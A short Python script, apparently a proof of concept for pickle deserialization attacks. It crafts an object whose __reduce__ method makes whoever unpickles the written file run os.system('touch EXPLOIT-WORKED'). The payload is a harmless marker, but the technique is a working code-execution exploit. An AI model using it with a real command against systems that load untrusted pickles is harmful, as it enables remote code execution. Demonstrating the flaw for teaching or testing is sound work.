import pickle
import  os

class MyExploit(object):
        def __reduce__(object):
            command = 'touch EXPLOIT-WORKED'
            return (os.system, (command,))

serialized = pickle.dumps(MyExploit())
filename = 'serialized.untrusted'

with open(filename, 'w') as file_object:
    file_object.write(serialized)
